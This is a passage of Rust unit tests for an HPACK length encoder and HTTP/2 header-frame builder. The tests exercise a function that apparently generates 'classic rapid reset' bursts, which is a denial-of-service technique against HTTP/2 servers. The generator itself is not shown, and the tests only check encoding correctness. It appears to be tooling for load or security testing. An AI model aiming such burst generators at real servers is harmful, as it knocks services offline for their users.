            // Bit 7 (Huffman flag) must be clear.
            assert_eq!(
                encoded[0] & 0x80,
                0,
                "Huffman bit must be clear for len={len}"
            );
        }
    }

    #[test]
    fn hpack_string_length_127_uses_multibyte() {
        // 127 = PREFIX_MAX — triggers continuation.
        let encoded = hpack_string_length(127);
        assert!(encoded.len() > 1, "127 must use multi-byte encoding");
        // First byte must be 127 (saturated 7-bit prefix).
        assert_eq!(encoded[0], 127);
        // Second byte encodes remainder = 127 - 127 = 0.
        assert_eq!(encoded[1], 0);
    }

    #[test]
    fn hpack_string_length_256_correct_encoding() {
        // 256 — the value that `as u8` would silently truncate to 0.
        // Correct: 127 (saturated prefix) + continuation byte(s) for 256-127=129.
        let encoded = hpack_string_length(256);
        // remainder = 256 - 127 = 129 ≥ 128 → needs 2 continuation bytes.
        // byte 0: 127 (saturated prefix)
        // byte 1: 129 & 0x7F | 0x80 = 0x01 | 0x80 = 0x81 (more follows)
        // byte 2: 129 >> 7 = 1 (final)
        assert_eq!(encoded[0], 127, "first byte must saturate the prefix");
        assert_eq!(
            encoded[1], 0x81,
            "second byte encodes low 7 bits with continuation"
        );
        assert_eq!(encoded[2], 0x01, "third byte encodes remaining bits");
        assert_eq!(encoded.len(), 3, "256 must encode as 3 bytes total");
    }

    #[test]
    fn minimal_headers_payload_long_authority_correct_length() {
        // Pre-fix: a 256-byte authority would truncate the HPACK length field to 0,
        // producing a corrupt header block that a parser would misread as a
        // zero-length :authority value followed by garbage.
        let authority = "a".repeat(256);
        let payload = minimal_headers_payload(&authority);
        // Find the length-varint position: after 0x82 0x84 0x87 0x10 0x01 (5 bytes).
        // hpack_string_length(256) = [127, 0x81, 0x01] = 3 bytes.
        assert_eq!(payload[5], 127, "first length byte must be 127 (saturated)");
        assert_eq!(
            payload[6], 0x81,
            "second length byte = low bits with continuation"
        );
        assert_eq!(payload[7], 0x01, "third length byte = remaining bits");
        // Authority bytes follow at position 8.
        assert_eq!(&payload[8..8 + 256], authority.as_bytes());
    }

    #[test]
    fn minimal_headers_payload_short_authority_single_byte_length() {
        // Short authority (e.g., "x.com" = 5 bytes) must use 1-byte length.
        let payload = minimal_headers_payload("x.com");
        // After 5 prefix bytes: length byte at index 5.
        assert_eq!(
            payload[5], 5,
            "5-char authority must use single-byte length 5"
        );
        assert_eq!(&payload[6..11], b"x.com");
    }

    #[test]
    fn classic_rapid_reset_long_authority_does_not_panic() {
        // A 300-byte authority would have caused a panic in the pre-fix code
        // via the truncated length byte making the HPACK block appear to have
        // a 0-length :authority with 300 bytes of garbage following it —
        // though the panic would only surface at the remote parser, not here.
        // The fix must produce a well-formed HPACK block without panicking.
        let authority = "very-long-domain-".repeat(18); // 306 bytes
        let burst = classic_rapid_reset(&authority, 1, 0x8);
        assert!(
            !burst.wire_bytes.is_empty(),
            "must produce non-empty wire bytes"
        );
        assert!(burst.wire_bytes.starts_with(CLIENT_PREFACE));
    }
}
